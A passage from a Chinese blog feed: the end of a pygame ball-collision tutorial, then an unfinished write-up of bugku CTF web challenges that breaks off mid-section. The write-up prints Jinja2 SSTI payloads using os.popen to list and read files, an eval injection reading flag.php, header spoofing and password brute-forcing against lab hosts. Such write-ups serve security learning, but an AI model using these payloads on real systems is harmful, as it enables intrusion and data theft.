title="碰撞检测"></a>碰撞检测</h2><blockquote><p>通常一个游戏中会有很多对象出现，而这些对象之间的“碰撞”在所难免，比如炮弹击中了飞机、箱子撞到了地面等。碰撞检测在绝大多数的游戏中都是一个必须得处理的至关重要的问题，pygame的sprite（动画精灵）模块就提供了对碰撞检测的支持。</p><p>这里我们暂时不介绍sprite模块提供的功能，因为要检测两个小球有没有碰撞其实非常简单，只需要检查球心的距离有没有小于两个球的半径之和。为了制造出更多的小球，我们可以通过对鼠标事件的处理，在点击鼠标的位置创建颜色、大小和移动速度都随机的小球，当然要做到这一点，我们可以把之前学习到的面向对象的知识应用起来。</p></blockquote><p>由于游戏的机制带有随机生成，所以接下来都使用draw来绘制小球。</p><p>现在需要考虑的事：</p><ul><li>点击鼠标生成小球</li><li>小球的颜色大小随机，但颜色不能重复</li><li>小球随机移动，碰到墙壁后换方向</li><li>两球碰撞后，大球吃掉小球，半径增加</li></ul><p>第一项放在事件里处理，先完成其他几项。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@unique</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Color</span>(<span class="hljs-title class_ inherited__">Enum</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;颜色&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># RED = (255,0,0)</span><br>    <span class="hljs-comment"># GREEN = (0, 255, 0)</span><br>    <span class="hljs-comment"># BLUE = (0, 0, 255)</span><br>    <span class="hljs-comment"># BLACK = (0, 0, 0)</span><br>    <span class="hljs-comment"># WHITE = (255, 255, 255)</span><br>    <span class="hljs-comment"># GRAY = (242, 242, 242)</span><br>    <br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">random_color</span>():<br>        <span class="hljs-string">&quot;&quot;&quot;随机颜色&quot;&quot;&quot;</span><br>        r = randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>        g = randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>        b = randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>        <span class="hljs-keyword">return</span> (r, g, b)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Ball</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;球&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, x, y, radius, sx, sy, color</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        初始化方法</span><br><span class="hljs-string">        :param x: 横坐标</span><br><span class="hljs-string">        :param y: 纵坐标</span><br><span class="hljs-string">        :param radius:半径</span><br><span class="hljs-string">        :param sx:移动x坐标速度</span><br><span class="hljs-string">        :param sy:移动y坐标速度</span><br><span class="hljs-string">        :param color:颜色</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.x = x<br>        self.y = y<br>        self.radius = radius<br>        self.sx = sx<br>        self.sy = sy<br>        self.color = color<br>        self.alive = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">move</span>(<span class="hljs-params">self, screen</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;移动&quot;&quot;&quot;</span><br>        self.x += self.sx<br>        self.y += self.sy<br>        <span class="hljs-comment"># 碰撞后转向</span><br>        <span class="hljs-keyword">if</span> self.x - self.radius &lt;= <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> \<br>                self.x + self.radius &gt;= screen.get_width():<br>            self.sx = - self.sx<br>        <span class="hljs-keyword">if</span> self.y - self.radius &lt;= <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> \<br>                self.y + self.radius &gt;= screen.get_height():<br>            self.sy = -self.sy<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">eat</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;吃其他球&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> self.alive <span class="hljs-keyword">and</span> other.alive <span class="hljs-keyword">and</span> self != other:<br>            dx, dy = self.x - other.x, self.y - other.y<br>            distance = sqrt(dx ** <span class="hljs-number">2</span> + dy ** <span class="hljs-number">2</span>)<br>            <span class="hljs-keyword">if</span> distance &lt; self.radius + other.radius \<br>                    <span class="hljs-keyword">and</span> self.radius &gt; other.radius:<br>                other.alive = <span class="hljs-literal">False</span><br>                self.radius = self.radius + <span class="hljs-built_in">int</span>(other.radius * <span class="hljs-number">0.146</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">draw</span>(<span class="hljs-params">self, screen</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;在窗口绘制球&quot;&quot;&quot;</span><br>        pygame.draw.circle(screen, self.color, (self.x, self.y), self.radius, <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><h2 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h2><blockquote><p>可以在事件循环中对鼠标事件进行处理，通过事件对象的<code>type</code>属性可以判定事件类型，再通过<code>pos</code>属性就可以获得鼠标点击的位置。如果要处理键盘事件也是在这个地方，做法与处理鼠标事件类似。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 定义装球的容器</span><br>    balls = []<br>    <span class="hljs-comment"># 初始化导入的pygame中的模块</span><br>    pygame.init()<br>    <span class="hljs-comment"># 初始化窗口大小</span><br>    screen = pygame.display.set_mode((<span class="hljs-number">800</span>, <span class="hljs-number">600</span>))<br>    <span class="hljs-comment"># 标题</span><br>    pygame.display.set_caption(<span class="hljs-string">&#x27;大球吃小球&#x27;</span>)<br>    running = <span class="hljs-literal">True</span><br>    <span class="hljs-comment"># 开启一个事件循环处理发生的事件</span><br>    <span class="hljs-keyword">while</span> running:<br>        <span class="hljs-comment"># 从消息队列中获取事件并对事件进行处理</span><br>        <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> pygame.event.get():<br>            <span class="hljs-keyword">if</span> event.<span class="hljs-built_in">type</span> == pygame.QUIT:<br>                running = <span class="hljs-literal">False</span><br>            <span class="hljs-comment"># 处理鼠标事件的代码</span><br>            <span class="hljs-keyword">if</span> event.<span class="hljs-built_in">type</span> == pygame.MOUSEBUTTONDOWN <span class="hljs-keyword">and</span> event.button == <span class="hljs-number">1</span>:<br>                <span class="hljs-comment"># event.button==1 为鼠标左键点击事件</span><br>                <span class="hljs-comment"># 获得鼠标点击的位置</span><br>                x, y = event.pos<br>                radius = randint(<span class="hljs-number">10</span>, <span class="hljs-number">100</span>)<br>                sx, sy = randint(-<span class="hljs-number">10</span>, <span class="hljs-number">10</span>), randint(-<span class="hljs-number">10</span>, <span class="hljs-number">10</span>)<br>                color = Color.random_color()<br>                <span class="hljs-comment"># 点击鼠标创建一个球</span><br>                ball = Ball(x,y,radius,sx,sy,color)<br>                <span class="hljs-comment">#将球加进容器</span><br>                balls.append(ball)<br>        <span class="hljs-comment"># 设计窗口的背景色</span><br>        screen.fill((<span class="hljs-number">245</span>, <span class="hljs-number">245</span>, <span class="hljs-number">220</span>))<br>        <span class="hljs-comment">#取出容器中的球，如果没被吃掉就绘制，被吃了就移除</span><br>        <span class="hljs-keyword">for</span> ball <span class="hljs-keyword">in</span> balls:<br>            <span class="hljs-keyword">if</span> ball.alive:<br>                ball.draw(screen)<br>            <span class="hljs-keyword">else</span>:<br>                balls.remove(ball)<br>        pygame.display.flip()<br>        <span class="hljs-comment"># 每隔50毫秒就改变小球位置刷新</span><br>        pygame.time.delay(<span class="hljs-number">50</span>)<br>        <span class="hljs-keyword">for</span> ball <span class="hljs-keyword">in</span> balls:<br>            ball.move(screen)<br>            <span class="hljs-comment">#检查球有没有吃其他球</span><br>            <span class="hljs-keyword">for</span> other <span class="hljs-keyword">in</span> balls:<br>                ball.eat(other)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>完成！</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/jackfrued/Python-100-Days/tree/master#python---100%E5%A4%A9%E4%BB%8E%E6%96%B0%E6%89%8B%E5%88%B0%E5%A4%A7%E5%B8%88">Python-100-days</a></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pygame</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bugku - 平台题（未完成）</title>
    <link href="/2023/09/29/2023/bugku%20-%20%E5%B9%B3%E5%8F%B0%E9%A2%98/"/>
    <url>/2023/09/29/2023/bugku%20-%20%E5%B9%B3%E5%8F%B0%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>网站更新了，原来的账号登不上哩。</p><p>重新练下手感，顺带写下东西吧。</p><h1 id="【web】"><a href="#【web】" class="headerlink" title="【web】"></a>【web】</h1><h2 id="Simple-SSTI-1-amp-Simple-SSTI-2"><a href="#Simple-SSTI-1-amp-Simple-SSTI-2" class="headerlink" title="Simple_SSTI_1&amp;Simple_SSTI_2"></a>Simple_SSTI_1&amp;Simple_SSTI_2</h2><p>页面上一句话：<em>You need pass in a parameter named flag。</em></p><p>提示我们需要传入一个名为flag的参数。</p><p>按F12查看源代码，发现另一条提示。</p><p><em>You know, in the flask, We often set a secret_key variable.</em></p><p>这提示可以提取两个词：flask、secret_key</p><p>查询后得知python中有一个名为Flask的框架，而SECRET_KEY用于存储秘钥。</p><p>flask框架主要使用jinja2作为渲染模板。</p><p>在jinja2中，使用<code>&#123;&#123; &#125;&#125;</code>来包含一个变量，例如<code>Hello &#123;&#123; user.name &#125;&#125;, you are a minor!</code>。</p><p>尝试直接查看config配置参数，得到flag。</p><p>输入<code>http://114.67.175.224:13852/?flag=&#123;&#123;config&#125;&#125;</code>后得到配置信息，从而找到’SECRET_KEY’: ‘flag{8e027365982c5e5c294f276dbc35f212}’,</p><p>同理也可以输入<code>/?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;</code></p><p>Simple_SSTI_2的flag不在config中显示。</p><p>尝试使用ls读取文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">http://<span class="hljs-number">114.67</span><span class="hljs-number">.175</span><span class="hljs-number">.224</span>:<span class="hljs-number">14221</span>/?flag=&#123;&#123;config.__class__.__init__.__globals__[%27os%<span class="hljs-number">27</span>].popen(%27ls%<span class="hljs-number">27</span>).read()&#125;&#125;<br><br><span class="hljs-string">&#x27;&#x27;&#x27; 详解</span><br><span class="hljs-string">__class__:查看变量所属的类</span><br><span class="hljs-string">__init__:初始化类，返回的类型为function</span><br><span class="hljs-string">__globals__:获取function所处的空间下可使用的module、方法、以及所有变量</span><br><span class="hljs-string">os.popen():一个允许你在python程序内执行shell命令，并获得标准输出信息的函数</span><br><span class="hljs-string">os.popen(cmd).read():执行命令后返回对象通过read读取输出结果</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>可见有Dockerfile app.py flag gunicorn.conf.py templates几个文件。</p><p>读取flag文件。</p><p><code>?flag=&#123;&#123;config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20flag%27).read()&#125;&#125;</code></p><p>获得flag{a203da2a8965118e5f54ea0d99e242cb}</p><h3 id="【SSTI注入】"><a href="#【SSTI注入】" class="headerlink" title="【SSTI注入】"></a><strong>【SSTI注入】</strong></h3><p><strong>漏洞</strong>：SSTI注入【服务器端模板注入攻击（Server-Side Template Injection）】</p><p><strong>该漏洞产生原因</strong>：服务器端接受用户输入后，过滤不严谨，将输入直接拼接到了模板中，导致编译渲染时执行了恶意代码，从而造成信息泄露、代码执行、getshell等问题。</p><p><strong>识别</strong>渲染引擎模板（判断SSTI类型）：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-09-30%20%E4%B8%8B%E5%8D%887.19.34.png" alt="截屏2023-09-30 下午7.19.34" style="zoom:50%;" /><p>jinja2的基础语法：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crystal">控制结构 <span class="hljs-template-variable">&#123;% %&#125;</span><br>变量取值 <span class="hljs-template-variable">&#123;&#123; &#125;&#125;</span><br>注释&#123;<span class="hljs-comment"># #&#125;</span><br></code></pre></td></tr></table></figure><p>关于SSTI注入的一些文章：</p><p>[关于flask的SSTI注入[通俗易懂]][1]</p><p>[细说服务器端模板注入（SSTI）][2]</p><p>[SSTI模板注入总结][3]</p><h2 id="滑稽"><a href="#滑稽" class="headerlink" title="滑稽"></a>滑稽</h2><p>直接f12，即可看到flag。</p><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-09-30%20%E4%B8%8B%E5%8D%888.26.43.png" alt="截屏2023-09-30 下午8.26.43" style="zoom:33%;" /><p>输入框只能输入1位数字。</p><p>直接f12，在查看器中增加maxlength的值。再在页面提交正确答案即可获得flag。</p><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><blockquote><p>$what&#x3D;$_GET[‘what’];<br> echo $what;<br> if($what&#x3D;&#x3D;’flag’)<br> echo ‘flag{****}’;</p></blockquote><p>很简单，直接在url传参。</p><p><code>http://114.67.175.224:12544/?what=flag</code></p><p>获得flag。</p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><blockquote><p>$what&#x3D;$_POST[‘what’];<br> echo $what;<br> if($what&#x3D;&#x3D;’flag’)<br> echo ‘flag{****}’;</p></blockquote><p>使用bp或者hackbar，提交post数据，what&#x3D;flag。</p><p>即可获得flag。</p><h3 id="【get-amp-post】"><a href="#【get-amp-post】" class="headerlink" title="【get&amp;post】"></a><strong>【get&amp;post】</strong></h3><p>get一般用于信息获取，而post用于修改服务器资源的请求。</p><p>get的请求数据会附在url后，post提交的数据放置在http报文实体的主体里。相较于get，post会更安全些。</p><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><blockquote><p>$num&#x3D;$_GET[‘num’];<br> if(!is_numeric($num))<br> {<br> echo $num;<br> if($num&#x3D;&#x3D;1)<br> echo ‘flag{**********}’;<br> }</p></blockquote><p>当num不为数字时且num&#x3D;&#x3D;1时，输出flag。</p><p>这涉及到一个php的基础知识，php的弱比较（&#x3D;&#x3D;）。</p><p>若字符串以数字开头，则去开头数字作为转化结果，若无数字，则输出0.</p><p>所以只要赋值以1开头的任意字符串即可。</p><h3 id="【php弱比较】"><a href="#【php弱比较】" class="headerlink" title="【php弱比较】"></a><strong>【php弱比较】</strong></h3><p>php字符串和数字的弱比较，取字符串的开头数字进行比较。</p><h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><p>跳出窗口提示flag就在这里。</p><p>F12查看源码，在js代码中发现了一串注释信息。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&lt;!-- &amp;#<span class="hljs-number">102</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">103</span>;&amp;#<span class="hljs-number">123</span>;&amp;#<span class="hljs-number">56</span>;&amp;#<span class="hljs-number">55</span>;&amp;#<span class="hljs-number">51</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">52</span>;&amp;#<span class="hljs-number">51</span>;&amp;#<span class="hljs-number">102</span>;&amp;#<span class="hljs-number">54</span>;&amp;#<span class="hljs-number">50</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">56</span>;&amp;#<span class="hljs-number">102</span>;&amp;#<span class="hljs-number">48</span>;&amp;#<span class="hljs-number">48</span>;&amp;#<span class="hljs-number">48</span>;&amp;#<span class="hljs-number">56</span>;&amp;#<span class="hljs-number">53</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">102</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">48</span>;&amp;#<span class="hljs-number">98</span>;&amp;#<span class="hljs-number">52</span>;&amp;#<span class="hljs-number">50</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">51</span>;&amp;#<span class="hljs-number">49</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">54</span>;&amp;#<span class="hljs-number">48</span>;&amp;#<span class="hljs-number">55</span>;&amp;#<span class="hljs-number">125</span>; --&gt;<br></code></pre></td></tr></table></figure><p><code>&amp;#</code>开头的是Unicode编码。</p><p>使用工具进行解码，unicode转为ascii，得到flag。</p><h3 id="【常见编码格式】"><a href="#【常见编码格式】" class="headerlink" title="【常见编码格式】"></a><strong>【常见编码格式】</strong></h3><p>[【参考】编码、加密算法等][4]</p><p><strong>一些常见的编码格式：</strong></p><p>Base64：结尾常会出现1-2个等号。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-01%20%E4%B8%8B%E5%8D%886.06.50.png" alt="截屏2023-10-01 下午6.06.50" style="zoom:33%;" /><p>Unicode：以 <code>\u</code>、<code>&amp;#</code> 或 <code>&amp;#x</code> 开头，后面是数字加字母组合</p><p>Escape：以 <code>%u</code> 开头，后面是数字加字母组合</p><p>URL&#x2F;Hex编码：以 <code>%</code> 开头，后面是数字加字母组合</p><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>页面一直在跳转，打开f12会发现有出现flag。</p><p>直接使用bp抓包，即可得到flag。</p><h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>页面没什么信息。</p><p>爆破一下目录，这里我选择使用dirsearch进行扫描。</p><p><code>dirsearch -u xxxx</code></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-01%20%E4%B8%8B%E5%8D%8810.21.36.png" alt="截屏2023-10-01 下午10.21.36"></p><p>进入shell.php，发现需要输入密码。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-01%20%E4%B8%8B%E5%8D%8810.22.52.png" alt="截屏2023-10-01 下午10.22.52"></p><p>使用bp抓包爆破得到flag。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-01%20%E4%B8%8B%E5%8D%8810.26.16.png" alt="截屏2023-10-01 下午10.26.16"></p><h2 id="本地管理员"><a href="#本地管理员" class="headerlink" title="本地管理员"></a>本地管理员</h2><p>页面一个登录框，随意输入用户名密码后回显：IP禁止访问，请联系本地管理员登陆，IP已被记录.</p><p>http请求包中有一个常用非标准的请求头字段为**<code>X-Forwarded-For</code>**，用于向服务器提供客户端的真实ip。</p><p>使用bp抓包，提交用户密码的post请求包中增加这个字段。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>页面回显：<code>Invalid credentials! Please try again!</code>，表明输入的用户名或密码有误。</p><p>查看页面源代码时可以发现一段base64加密的提示，解码后得到：test123。猜测其是用户名或者密码。</p><p>接下来使用bp爆破，用户名为admin、密码为test123时得到flag。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-02%20%E4%B8%8B%E5%8D%888.11.50.png" alt="截屏2023-10-02 下午8.11.50"></p><h3 id="【html请求头-X-Forwarded-For】"><a href="#【html请求头-X-Forwarded-For】" class="headerlink" title="【html请求头 X-Forwarded-For】"></a>【html请求头 X-Forwarded-For】</h3><p>[X-Forwarded-For][5]:（XFF）请求标头是一个事实上的用于标识通过代理服务器连接到 web 服务器的客户端的原始 IP 地址的标头。</p><h2 id="bp"><a href="#bp" class="headerlink" title="bp"></a>bp</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-02%20%E4%B8%8B%E5%8D%888.16.41.png" alt="截屏2023-10-02 下午8.16.41" style="zoom:50%;" /><p>随意输入密码后显示<code>Wrong account or password!</code></p><p>该题目的提示是：弱密码top1000？z?????</p><p>估摸着就是要直接爆破出密码，但尝试后发现并回包长度都一样，并不能这么做。</p><p>查看源码，发现一段有意思的js代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>  <span class="hljs-keyword">var</span> r = &#123;<span class="hljs-attr">code</span>: <span class="hljs-string">&#x27;bugku10000&#x27;</span>&#125;<br>  <span class="hljs-keyword">if</span>(r.<span class="hljs-property">code</span> == <span class="hljs-string">&#x27;bugku10000&#x27;</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;e&#x27;</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;d&#x27;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&quot;Wrong account or password!&quot;</span>;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;0&#x27;</span>);<br>        <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">&#x27;success.php?code=&#x27;</span>+r.<span class="hljs-property">code</span>;<br>  &#125;<br>  <br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>判断code值不为bugku10000时，才会有其他的回显。</p><p>在bp的grep-match中添加<code>code: &#39;bugku10000&#39;</code></p><p>发现密码为zxc123。（这时候才发觉提示里的z？？？？？？原来是密码提示）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-02%20%E4%B8%8B%E5%8D%888.36.58.png" alt="截屏2023-10-02 下午8.36.58"></p><p>登陆后获得flag。</p><h3 id="【bp：Grep-match】"><a href="#【bp：Grep-match】" class="headerlink" title="【bp：Grep-match】"></a>【bp：Grep-match】</h3><p>bp的intruder模块中的Grep - Match功能：从回包中提取指定内容，便于查看。</p><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p>页面上显示这一串php代码，很明显是一个代码审计题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br>    <span class="hljs-keyword">eval</span>( <span class="hljs-string">&quot;var_dump(<span class="hljs-subst">$a</span>);&quot;</span>);<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><blockquote><p><strong>include</strong> 调用php文件。</p><p><strong><a href="https://www.runoob.com/php/func-misc-eval.html">eval()</a></strong> 函数把字符串按照 PHP 代码来计算。</p><p><strong>PHP $_REQUEST</strong> 用于收集HTML表单提交的数据。</p><p><strong><a href="https://www.runoob.com/php/php-var_dump-function.html">var_dump()</a></strong> 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p><p>**<a href="https://www.w3school.com.cn/php/func_misc_show_source.asp">show_source()</a>**是PHP中的内置函数，用于返回突出显示PHP语法的文件。</p></blockquote><p>直接在url赋值hello&#x3D;$flag，回显<code>string(20) &quot;Too Young Too Simple&quot;</code></p><p>赋值hello&#x3D;show_source(‘flag.php’)尝试直接读取文件，成功显示flag。</p><p>*看评论区后发现也可以使用file_get_contents()*。</p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><blockquote><p>flag In the variable ! &lt;?php  </p><p>error_reporting(0);<br>include “flag1.php”;<br>highlight_file(<strong>file</strong>);<br>if(isset($_GET[‘args’])){<br>    $args &#x3D; $_GET[‘args’];<br>    if(!preg_match(“&#x2F;^\w+$&#x2F;“,$args)){<br>        die(“args error!”);<br>    }<br>    eval(“var_dump($$args);”);<br>}<br>?&gt; </p></blockquote><p>又是代码审计题，提示flag在变量里。</p><p>^\w+$表示限定任意长的字符串，全部由字母数字和下划线组成（空格标点和非\w字符都不允许）。</p><p>也就是获取args后，若不满足条件，输出args error，否则输出args的内容。</p><p>这里利用php的全局变量$GLOBALS。</p><blockquote><p><code>$GLOBALS</code>一个包含了所有变量的全局组合数组。变量的名字就是数组的键。（即全部出现过的全局变量，均可经过$GLOBALS获取到）数组</p></blockquote><p>赋值args&#x3D;GLOBALS，即可得到flag。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-06%20%E4%B8%8B%E5%8D%884.17.02.png" alt="截屏2023-10-06 下午4.17.02"></p><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-07%20%E4%B8%8B%E5%8D%885.47.18.png" alt="截屏2023-10-07 下午5.47.18" style="zoom:33%;" /><p>页面就一句话，什么也没有。</p><p>源码里也啥都没有。</p><p>尝试目录扫描，什么也没有。</p><p>头等舱，应该跟什么头有关。猜测可能是响应头。</p><p>F12后在网络中查看响应头，找到flag。</p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-10-07%20%E4%B8%8B%E5%8D%885.55.19.png" alt="截屏2023-10-07 下午5.55.19"></p><p>根据提示查看源代码，发现了以下语句。</p><figure 